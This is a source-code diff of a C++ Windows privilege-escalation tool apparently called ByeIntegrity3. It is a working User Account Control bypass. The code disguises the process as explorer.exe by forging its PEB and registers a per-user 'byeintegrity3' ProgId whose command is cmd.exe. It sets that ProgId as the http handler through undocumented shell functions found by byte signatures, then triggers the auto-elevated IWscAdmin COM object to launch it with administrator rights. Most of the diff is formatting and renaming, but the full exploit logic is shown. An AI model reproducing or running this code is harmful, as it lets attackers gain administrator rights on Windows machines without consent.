@@ -1,7 +1,5 @@
 #include <Windows.h>
 #include <ShlObj.h>
-#include <ShObjIdl.h>
-#include <WinTrust.h>
 #include <iostream>
 #include <string>
 
@@ -12,13 +10,13 @@ typedef struct _UNICODE_STRING
 	unsigned short MaximumLength;
 	long Padding_8;
 	wchar_t* Buffer;
-} UNICODE_STRING, * PUNICODE_STRING;
+} UNICODE_STRING, *PUNICODE_STRING;
 
 typedef struct _CURDIR
 {
 	struct _UNICODE_STRING DosPath;
 	void* Handle;
-} CURDIR, * PCURDIR;
+} CURDIR, *PCURDIR;
 
 typedef struct _STRING
 {
@@ -26,7 +24,7 @@ typedef struct _STRING
 	unsigned short MaximumLength;
 	long Padding_94;
 	char* Buffer;
-} STRING, * PSTRING;
+} STRING, *PSTRING;
 
 typedef struct _RTL_DRIVE_LETTER_CURDIR
 {
@@ -34,7 +32,7 @@ typedef struct _RTL_DRIVE_LETTER_CURDIR
 	unsigned short Length;
 	unsigned long TimeStamp;
 	struct _STRING DosPath;
-} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;
+} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;
 
 typedef struct _RTL_USER_PROCESS_PARAMETERS
 {
@@ -78,7 +76,7 @@ typedef struct _RTL_USER_PROCESS_PARAMETERS
 	unsigned __int64* DefaultThreadpoolCpuSetMasks;
 	unsigned long DefaultThreadpoolCpuSetMaskCount;
 	long __PADDING__[1];
-} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
+} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
 
 constexpr auto PEB_OFFSET = 0x60ULL;
 constexpr auto PROCESS_PARAM_OFFSET = 0x20ULL;
@@ -93,8 +91,8 @@ using RtlInitUnicodeStringPtr = void(NTAPI*)(PUNICODE_STRING, PCWSTR);
 using LDR_ENUM_CALLBACK = void(NTAPI*)(PVOID, PVOID, PBOOLEAN);
 using LdrEnumerateLoadedModulesPtr = NTSTATUS(NTAPI*)(ULONG, LDR_ENUM_CALLBACK, PVOID);
 
-using UserSetAssocPtr = void(WINAPI*)(int unknown0, PCWCHAR fileType, PCWCHAR progId);
-using UserSetAssocInternalPtr = HRESULT(WINAPI*)(void* unused0, PCWCHAR fileType, PCWCHAR progId, int unknown0);
+using UserAssocSetPtr = void(WINAPI*)(int unknown0, PCWCHAR fileType, PCWCHAR progId);
+using UserAssocSetInternalPtr = HRESULT(WINAPI*)(void* unused0, PCWCHAR fileType, PCWCHAR progId, int unknown0);
 
 struct LDR_CALLBACK_PARAMS
 {
@@ -115,7 +113,7 @@ struct IWscAdmin : IUnknown
 	) = 0;
 };
 
-const GUID IID_IWscAdmin = { 0x49ACAA99, 0xF009, 0x4524, {0x9D, 0x2A, 0xD7, 0x51, 0xC9, 0xA3, 0x8F, 0x60} };
+const GUID IID_IWscAdmin = {0x49ACAA99, 0xF009, 0x4524, {0x9D, 0x2A, 0xD7, 0x51, 0xC9, 0xA3, 0x8F, 0x60}};
 
 const BYTE SIGNATURE_NT10[] = {
 	0x48, 0x8B, 0xC4, 0x55, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0x68, 0xA1, 0x48, 0x81, 0xEC, 0xA0,
@@ -128,7 +126,7 @@ const BYTE SIGNATURE_NT6X[] = {
 };
 
 void ForgeProcessInformation(PCWCHAR explorerPath, const RtlInitUnicodeStringPtr RtlInitUnicodeString,
-	const LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules)
+                             const LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules)
 {
 	auto* const pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
 	auto* pProcessParams = *reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(pPeb + PROCESS_PARAM_OFFSET);
@@ -136,24 +134,24 @@ void ForgeProcessInformation(PCWCHAR explorerPath, const RtlInitUnicodeStringPtr
 	RtlInitUnicodeString(&pProcessParams->ImagePathName, explorerPath);
 	RtlInitUnicodeString(&pProcessParams->CommandLine, L"explorer.exe");
 
-	LDR_CALLBACK_PARAMS params{ explorerPath, GetModuleHandleW(nullptr), RtlInitUnicodeString };
+	LDR_CALLBACK_PARAMS params{explorerPath, GetModuleHandleW(nullptr), RtlInitUnicodeString};
 
 	LdrEnumerateLoadedModules(0, [](PVOID ldrEntry, PVOID context, PBOOLEAN stop)
+	{
+		auto* params = static_cast<LDR_CALLBACK_PARAMS*>(context);
+
+		if (*reinterpret_cast<PULONG_PTR>(reinterpret_cast<ULONG_PTR>(ldrEntry) + DLL_BASE_OFFSET) == reinterpret_cast<
+			ULONG_PTR>(params->ImageBase))
 		{
-			auto* params = static_cast<LDR_CALLBACK_PARAMS*>(context);
+			const auto baseName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + BASENAME_OFFSET),
+			           fullName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + FULLNAME_OFFSET);
 
-			if (*reinterpret_cast<PULONG_PTR>(reinterpret_cast<ULONG_PTR>(ldrEntry) + DLL_BASE_OFFSET) == reinterpret_cast<
-				ULONG_PTR>(params->ImageBase))
-			{
-				const auto baseName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + BASENAME_OFFSET),
-					fullName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + FULLNAME_OFFSET);
+			params->RtlInitUnicodeString(baseName, L"explorer.exe");
+			params->RtlInitUnicodeString(fullName, params->ExplorerPath);
 
-				params->RtlInitUnicodeString(baseName, L"explorer.exe");
-				params->RtlInitUnicodeString(fullName, params->ExplorerPath);
-
-				*stop = TRUE;
-			}
-		}, reinterpret_cast<PVOID>(&params));
+			*stop = TRUE;
+		}
+	}, reinterpret_cast<PVOID>(&params));
 }
 
 template <typename T>
@@ -166,20 +164,31 @@ T LocateSignature(const BYTE signature[], const int signatureSize, const char* s
 	while (std::strcmp(sectionName, reinterpret_cast<char*>(sectionHeader->Name)))
 		sectionHeader++;
 
-	for (auto* i = reinterpret_cast<PUCHAR>(moduleHandle) + sectionHeader->PointerToRawData; i != reinterpret_cast<PUCHAR
-	     >(moduleHandle) + sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData - signatureSize; i++)
+	for (auto* i = reinterpret_cast<PUCHAR>(moduleHandle) + sectionHeader->PointerToRawData; i != reinterpret_cast<
+		     PUCHAR>(moduleHandle) + sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData - signatureSize; i++
+	)
 	{
-		if (memcmp(signature, i, signatureSize) == 0)
+		if (std::memcmp(signature, i, signatureSize) == 0)
 			return reinterpret_cast<T>(i);
 	}
-	
+
 	return reinterpret_cast<T>(nullptr);
 }
 
 int main()
 {
-	auto hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
-	
+	auto* hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+
+	SetConsoleTextAttribute(hConsole, 8);
+	std::wcout <<
+		L" __________              .___        __                      .__  __          ________  \n"
+		L" \\______   \\___.__. ____ |   | _____/  |_  ____   ___________|__|/  |_ ___.__.\\_____  \\ \n"
+		L"  |    |  _<   |  |/ __ \\|   |/    \\   __\\/ __ \\ / ___\\_  __ \\  \\   __<   |  |  _(__  < \n"
+		L"  |    |   \\\\___  \\  ___/|   |   |  \\  | \\  ___// /_/  >  | \\/  ||  |  \\___  | /       \\\n"
+		L"  |______  // ____|\\___  >___|___|  /__|  \\___  >___  /|__|  |__||__|  / ____|/______  /\n"
+		L"         \\/ \\/         \\/         \\/          \\/_____/                 \\/            \\/ \n\n";
+	SetConsoleTextAttribute(hConsole, 7);
+
 	auto* const pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
 	const auto osMajorVersion = *reinterpret_cast<PULONG>(pPeb + OS_MAJOR_VERSION_OFFSET);
 	const auto osMinorVersion = *reinterpret_cast<PULONG>(pPeb + OS_MINOR_VERSION_OFFSET);
@@ -205,18 +214,18 @@ int main()
 		return EXIT_FAILURE;
 	}
 
-	std::wstring explorer{ windowsPath }, system32{ systemPath };
+	std::wstring explorer{windowsPath}, system32{systemPath};
 	CoTaskMemFree(windowsPath);
 	CoTaskMemFree(systemPath);
 	explorer += L"\\explorer.exe";
-	
+
 	const auto RtlInitUnicodeString = reinterpret_cast<RtlInitUnicodeStringPtr>(GetProcAddress(
 		GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString"));
 	const auto LdrEnumerateLoadedModules = reinterpret_cast<LdrEnumerateLoadedModulesPtr>(GetProcAddress(
 		GetModuleHandleW(L"ntdll.dll"), "LdrEnumerateLoadedModules"));
 
 	ForgeProcessInformation(explorer.c_str(), RtlInitUnicodeString, LdrEnumerateLoadedModules);
-	
+
 	hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
 	if (FAILED(hr))
 	{
@@ -226,7 +235,7 @@ int main()
 
 	HKEY key;
 	auto status = RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity3\\shell\\open\\command", 0,
-		nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &key, nullptr);
+	                              nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &key, nullptr);
 	if (status)
 	{
 		CoUninitialize();
@@ -235,7 +244,7 @@ int main()
 	}
 	system32 += L"\\cmd.exe";
 	status = RegSetValueExW(key, nullptr, 0, REG_SZ, reinterpret_cast<const BYTE*>(system32.c_str()),
-		system32.size() * sizeof WCHAR + sizeof(L'\0'));
+	                        static_cast<DWORD>(system32.size() * sizeof WCHAR + sizeof(L'\0')));
 	RegCloseKey(key);
 	if (status)
 	{
@@ -248,7 +257,7 @@ int main()
 	if (osMajorVersion == 10 && osMinorVersion == 0)
 	{
 		const auto hModule = LoadLibraryExW(L"SystemSettings.Handlers.dll", nullptr,
-			LOAD_LIBRARY_SEARCH_SYSTEM32);
+		                                    LOAD_LIBRARY_SEARCH_SYSTEM32);
 		if (!hModule)
 		{
 			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity3");
@@ -257,25 +266,25 @@ int main()
 			return EXIT_FAILURE;
 		}
 
-		const auto UserSetAssocInternal = LocateSignature<UserSetAssocInternalPtr>(
+		const auto UserAssocSetInternal = LocateSignature<UserAssocSetInternalPtr>(
 			SIGNATURE_NT10, sizeof SIGNATURE_NT10, ".text", hModule);
-		if (!UserSetAssocInternal)
+		if (!UserAssocSetInternal)
 		{
 			FreeLibrary(hModule);
 			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity3");
 			CoUninitialize();
-			std::wcout << L"SystemSettings.Handlers.dll!UserSetAssoc->\"Internal\" not found.\n";
+			std::wcout << L"SystemSettings.Handlers.dll!UserAssocSet->\"Internal\" not found.\n";
 			return EXIT_FAILURE;
 		}
 
-		hr = UserSetAssocInternal(nullptr, L"http", L"byeintegrity3", 1);
+		hr = UserAssocSetInternal(nullptr, L"http", L"byeintegrity3", 1);
 		FreeLibrary(hModule);
 		if (FAILED(hr))
 		{
 			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity3");
 			CoUninitialize();
 			std::wcout <<
-				L"SystemSettings.Handlers.dll!UserSetAssoc->\"Internal\" did not return S_OK. Return value -> HRESULT 0x"
+				L"SystemSettings.Handlers.dll!UserAssocSet->\"Internal\" did not return S_OK. Return value -> HRESULT 0x"
 				<< std::hex << hr << std::endl;
 			return EXIT_FAILURE;
 		}
@@ -291,17 +300,18 @@ int main()
 			return EXIT_FAILURE;
 		}
 
-		const auto UserSetAssoc = LocateSignature<UserSetAssocPtr>(SIGNATURE_NT6X, sizeof SIGNATURE_NT6X, ".text", hModule);
-		if (!UserSetAssoc)
+		const auto UserAssocSet = LocateSignature<UserAssocSetPtr>(SIGNATURE_NT6X, sizeof SIGNATURE_NT6X, ".text",
+		                                                           hModule);
+		if (!UserAssocSet)
 		{
 			FreeLibrary(hModule);
 			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity3");
 			CoUninitialize();
-			std::wcout << L"shell32.dll!UserSetAssoc not found.\n";
+			std::wcout << L"shell32.dll!UserAssocSet not found.\n";
 			return EXIT_FAILURE;
 		}
 
-		UserSetAssoc(2, L"http", L"byeintegrity3");
+		UserAssocSet(2, L"http", L"byeintegrity3");
 		FreeLibrary(hModule);
 	}
 	else if (osMajorVersion == 6 && osMinorVersion == 1)
@@ -323,7 +333,8 @@ int main()
 	bind.dwClassContext = CLSCTX_LOCAL_SERVER;
 
 	IWscAdmin* wscAdmin;
-	hr = CoGetObject(L"Elevation:Administrator!new:{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}", &bind, IID_IWscAdmin, reinterpret_cast<void**>(&wscAdmin));
+	hr = CoGetObject(L"Elevation:Administrator!new:{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}", &bind, IID_IWscAdmin,
+	                 reinterpret_cast<void**>(&wscAdmin));
 	if (FAILED(hr))
 	{
 		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity3");
@@ -343,6 +354,9 @@ int main()
 	}
 
 	hr = wscAdmin->DoModalSecurityAction(nullptr, 103, 0);
+	/* Sleep for one second to allow the action to happen, otherwise we'll delete the registry key before it has
+	 * a chance to read and use it. It's because this action happens async. in another process. I know, its strange
+	 * but that's how it is. */
 	Sleep(1000);
 	wscAdmin->Release();
 	RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity3");
